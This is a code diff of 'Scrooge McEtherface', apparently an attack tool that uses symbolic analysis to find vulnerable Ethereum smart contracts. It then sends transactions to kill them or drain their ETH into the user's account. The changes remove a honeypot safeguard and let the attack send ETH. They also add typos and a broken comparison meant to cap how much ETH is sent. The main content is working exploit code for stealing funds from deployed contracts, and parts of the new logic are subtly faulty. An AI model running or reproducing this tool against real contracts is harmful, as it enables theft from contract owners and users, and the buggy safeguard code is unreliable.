@@ -4,13 +4,13 @@ import os
 import re
 import sys
 import json
-import logging
 from mythril.mythril import Mythril
 from web3 import Web3, HTTPProvider
 from configparser import ConfigParser
 from enum import Enum
 
-# Uncomment the line below to get verbose logging.
+# Uncomment the lines below to get verbose logging.
+# import logging
 # logging.basicConfig(level=logging.INFO)
 
 
@@ -37,9 +37,9 @@ def critical(message):
     sys.exit()
 
 
-def w3_request_blocking(sender, receiver, data):
+def w3_request_blocking(sender, receiver, value, data):
     tx_hash = w3.eth.sendTransaction(
-        {"to": receiver, "from": sender, "data": data, "gas": 1000000}
+        {"to": receiver, "from": sender, "data": data, "value": value, "gas": 5000000}
     )
 
     print(
@@ -77,7 +77,7 @@ def get_vulns(target_address, tx_count):
     nIssues = len(report.issues)
 
     if nIssues == 0:
-        raise (InvulnerableError)
+        raise InvulnerableError
 
     vulns = []
 
@@ -87,48 +87,49 @@ def get_vulns(target_address, tx_count):
         tx = issue["debug"].replace("\n", " ").replace("'", '"')
         transactions = json.loads(tx)
 
-        if re.search(r"call_value': '0x[0]*[1-9a-fA-F]", str(transactions)):
-            # Honeypot prevention.
-            # We might miss issues that require small amounts of ETH to be sent,
-            # but better err on the safe side.
-            logging.info("Ignoring transaction sequence that requires sending of ETH.")
-            continue
-
         if "withdraw its balance" in issue["description"]:
             _type = VulnType.KILL_AND_WITHDRAW
-            description = "Anybody can kill this contract and steal its balance."
+            description = "Looks line anyone can kill this contract and steal its balance."
         elif "withdraw ETH" in issue["description"]:
             _type = VulnType.ETHER_THEFT
-            description = "Anybody can withdraw ETH from this contract."
+            description = "Looks like anyone can withdraw ETH from this contract."
         else:
             _type = VulnType.KILL_ONLY
-            description = "Anybody can kill this contract."
+            description = "Anybody can accidentally kill this contract."
 
         vulns.append(Vulnerability(_type, description, transactions))
 
     if len(vulns):
         return vulns
 
-    raise (InvulnerableError)
+    raise InvulnerableError
 
 
 def commence_attack(sender_address, target_address, vuln):
     print(vuln.description)
 
-    for id, tx in vuln.transactions.items():
+    for _id, tx in vuln.transactions.items():
         data = tx["calldata"].replace(
             "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef", sender_address[2:]
         )
+        value = int(tx["call_value"], 16)
+
+        if value > w3.fromWei(value, 'ether') > 0.99:
+            critical(
+                "Not proceeding with attack as it requires sending a lot of ETH. Too risky."
+            )
+        elif value > 0:
+            print("WARNING: You;ll be transferring %.05f ETH wth this transaction" % w3.fromWei(value, 'ether'))
 
         print(
-            "You are about to send the following transaction:\nFrom: %s, To: %s, Value: 0\nData: %s"
-            % (sender_address, target_address, str(tx["calldata"]))
+            "You are about to send the following transaction:\nFrom: %s, To: %s, Value: %d\nData: %s"
+            % (sender_address, target_address, value, str(tx["calldata"]))
         )
         response = input("Are you sure you want to proceed (y/N)?\n")
 
         if response == "y":
             try:
-                w3_request_blocking(sender_address, target_address, data)
+                w3_request_blocking(sender_address, target_address, value, data)
             except Exception as e:
                 print("Error sending transaction: %s" % str(e))
 
@@ -169,13 +170,13 @@ w3 = Web3(HTTPProvider(rpc))
 # Commence attack
 
 print(
-    "Scrooge McEtherface at your service.\nExploring %s with %d symbolic transactions.\n"
+    "Scrooge McEtherface at your service.\nExploring %s over %d symbolic transactions.\n"
     % (target_address, tx_count)
 )
 
 balance = w3.fromWei(w3.eth.getBalance(sender_address), "ether")
 
-print("Your initial account balance is %.02f ETH.\nCharging lasers..." % balance)
+print("Your initial account balance is %.05f ETH.\nCharging lasers..." % balance)
 
 # FIXME: Handle multiple issues being returned
 
@@ -194,7 +195,7 @@ _balance = w3.fromWei(w3.eth.getBalance(sender_address), "ether")
 
 if _balance > balance:
     print(
-        "Snagged %d ETH. Your final account balance is %.02f ETH.\n"
+        "Snagged %d ETH. Your final account balance is %.05f ETH.\n"
         % (_balance - balance, _balance)
     )
 else:
